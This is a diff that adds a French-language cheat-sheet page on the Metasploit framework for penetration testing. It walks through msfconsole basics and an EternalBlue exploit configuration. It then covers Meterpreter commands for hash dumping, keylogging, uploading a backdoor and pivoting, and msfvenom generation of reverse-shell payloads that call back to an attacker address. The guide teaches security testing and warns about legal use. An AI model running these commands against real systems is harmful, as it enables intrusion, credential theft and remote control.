@@ -1,0 +1,152 @@
+---
+title: "Metasploit — Framework d'Exploitation"
+description: "Guide d'utilisation du framework Metasploit : modules, exploits, payloads et post-exploitation."
+category: "offensive"
+tags: ["metasploit", "exploitation", "pentest", "red-team"]
+date: "2026-02-10"
+author: "CyberVault"
+---
+
+## Introduction
+
+Metasploit est le framework d'exploitation le plus populaire en cybersécurité offensive. Il fournit un ensemble complet d'outils pour le test de pénétration, du scan initial à la post-exploitation.
+
+## Architecture de Metasploit
+
+Le framework est organisé en modules :
+
+| Type | Description |
+|------|-------------|
+| <TechBadge variant="warning">Exploits</TechBadge> | Code d'exploitation de vulnérabilités |
+| <TechBadge variant="tool">Payloads</TechBadge> | Code exécuté après exploitation |
+| <TechBadge variant="protocol">Auxiliary</TechBadge> | Modules de scan et fuzzing |
+| <TechBadge variant="info">Post</TechBadge> | Modules de post-exploitation |
+| <TechBadge variant="flag">Encoders</TechBadge> | Obfuscation de payloads |
+
+## Commandes de Base
+
+### Démarrage et Navigation
+
+<CheatSheetCode title="msfconsole-basics.sh" language="bash">
+```bash
+# Lancer Metasploit
+msfconsole
+
+# Mettre à jour la base de données
+msfdb init
+msfdb start
+
+# Rechercher un exploit
+search type:exploit name:smb
+search cve:2017-0144
+
+# Informations sur un module
+info exploit/windows/smb/ms17_010_eternalblue
+
+# Sélectionner un module
+use exploit/windows/smb/ms17_010_eternalblue
+```
+</CheatSheetCode>
+
+### Configuration d'un Exploit
+
+<CheatSheetCode title="exploit-config.sh" language="bash">
+```bash
+# Voir les options requises
+show options
+
+# Configurer la cible
+set RHOSTS 192.168.1.100
+set RPORT 445
+
+# Configurer le payload
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+set LPORT 4444
+
+# Lancer l'exploit
+exploit
+# ou en arrière-plan
+exploit -j
+```
+</CheatSheetCode>
+
+## Meterpreter — Post-Exploitation
+
+Meterpreter est le payload le plus puissant de Metasploit. Il fournit un shell interactif avancé sur la machine compromise.
+
+<CheatSheetCode title="meterpreter-commands.sh" language="bash">
+```bash
+# Informations système
+sysinfo
+getuid
+getpid
+
+# Navigation fichiers
+ls
+cd C:\\Users
+download secret.txt
+upload backdoor.exe
+
+# Réseau
+ipconfig
+route
+portfwd add -l 3389 -p 3389 -r 10.0.0.1
+
+# Escalade de privilèges
+getsystem
+hashdump
+
+# Capture d'écran et keylogger
+screenshot
+keyscan_start
+keyscan_dump
+```
+</CheatSheetCode>
+
+## Génération de Payloads avec msfvenom
+
+<TechBadge variant="tool">msfvenom</TechBadge> permet de générer des payloads standalone :
+
+<CheatSheetCode title="msfvenom.sh" language="bash">
+```bash
+# Payload Windows (exe)
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f exe -o payload.exe
+
+# Payload Linux (elf)
+msfvenom -p linux/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f elf -o payload.elf
+
+# Payload Web (PHP)
+msfvenom -p php/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f raw -o shell.php
+
+# Lister les formats disponibles
+msfvenom --list formats
+
+# Lister les encoders
+msfvenom --list encoders
+```
+</CheatSheetCode>
+
+<NetworkDiagram title="Architecture d'attaque Metasploit">
+  ```
+  [Attacker:4444]                    [Target:445]
+       │                                  │
+       │ ── Exploit (EternalBlue) ──────> │
+       │                                  │
+       │ <── Meterpreter Session ──────── │
+       │                                  │
+       │    [Post-Exploitation]           │
+       │    - hashdump                    │
+       │    - pivot → [Internal:3389]     │
+  ```
+</NetworkDiagram>
+
+## Résumé
+
+Metasploit est un outil essentiel pour les tests de pénétration. Sa modularité et sa communauté active en font le framework de référence pour la cybersécurité offensive. **À utiliser uniquement dans un cadre légal et autorisé.**
